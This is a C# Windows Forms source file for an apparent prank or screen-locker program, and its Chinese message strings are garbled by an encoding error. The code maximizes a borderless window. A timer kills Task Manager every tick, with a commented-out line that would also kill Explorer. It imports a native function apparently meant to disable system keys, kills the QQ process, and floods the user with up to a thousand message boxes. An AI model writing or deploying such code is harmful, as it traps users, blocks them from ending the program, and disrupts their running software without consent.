using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace MainForm
{


    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
           
        }

        #region �ر�ĳ����
        public static void KillProcess(string processName)
        {
            System.Diagnostics.Process myproc = new System.Diagnostics.Process();
            try
            {
                foreach (Process thisproc in Process.GetProcessesByName(processName))
                {
                    if (!thisproc.CloseMainWindow())
                    {
                        if (thisproc != null)
                            thisproc.Kill();
                    }
                }
            }
            catch (Exception Exc)
            {
                MessageBox.Show("�ǳ���������û����Q�������и�����ģ���");
                throw Exc;
            }
        }
        #endregion 

        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {

        }

        [DllImport(@"native.dll", EntryPoint = "FuckSysKey")]
        private extern static bool FuckSysKey(bool enAble);

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("make by -----09ATA2(ltp)");
            button1.Visible = false;
            this.SetVisibleCore(false);
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.SetVisibleCore(true); 

            
        }

        private void execute()
        {
            for (int i = 0; i < 1000; i++)
            {

                MessageBox.Show("������" + i + "��ȷ���ˣ���Ҫ�����𣿣�");

                if (i == 500)
                {
                    MessageBox.Show("��֪�������Ѿ������500��ȷ���ˣ�����������");
                }
                if (i == 999)
                {
                    MessageBox.Show("�ۣ������1000�ΰ������������");
                }
            }
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.ControlKey && e.KeyCode == Keys.Alt && e.KeyCode == Keys.Delete)
            {    //�����Ի���
                MessageBox.Show("��ñ��ٰ� ctrl+alt+delete�������Զ��ػ�������");
            }

            if (e.KeyCode == Keys.Enter)
            {
                for (int i = 0; i < 100; i++)
                {
                    MessageBox.Show("���ĵ��㣬������enter����100��");
                }
            }
        }

        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.ControlKey)
            {    //�����Ի���
                MessageBox.Show("��ñ��ٰ� ctrl+alt+delete�������Զ��ػ�������");
            }
            if (e.KeyCode == Keys.Enter)
            {
                for (int i = 0; i < 100; i++)
                {
                    MessageBox.Show("���ĵ��㣬������enter����100��");
                }
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            FuckSysKey(false);
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            FuckSysKey(true);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            KillProcess("taskmgr");
           // KillProcess("explorer");
            WindowState = FormWindowState.Maximized;
        }

        private void button1_Click_2(object sender, EventArgs e)
        {
            if ((MessageBox.Show("��ϲ�㣬���ϾͿ����˳��ˣ���------------by ����","��ʾ", MessageBoxButtons.OKCancel)) == DialogResult.OK)
            {
                MessageBox.Show("�����Cancel���Ǿͼ����ɣ����´μǵõ�ȷ��������������");
                MessageBox.Show("-------------------------�´μǵ�Ҫ��ȡ���������˳�����---------------------------------");
                execute();
            }
            else
            {
                MessageBox.Show("�˳������´μ�������");
                Application.Exit();
            }
            
        }

        private void button2_Click_2(object sender, EventArgs e)
        {
            if (textBox1.Text == "���Ǳ���")
            {
                MessageBox.Show("�����ȷ������Ϸ���ڿ�ʼ������");
                KillProcess("QQ");
                MessageBox.Show("------------��Ϸ��ʼǰҪ�ȣ��ر������QQ--------------���ݰݣ���");
                execute();
                button1.Visible = true;
            }
            else
            {
                MessageBox.Show("�㲻˵�ǰɣ������1000��ȷ��������������");
                execute();
                MessageBox.Show("�ͷ����ˣ��������������ı���������ȷ������");
            }
        }
    }
}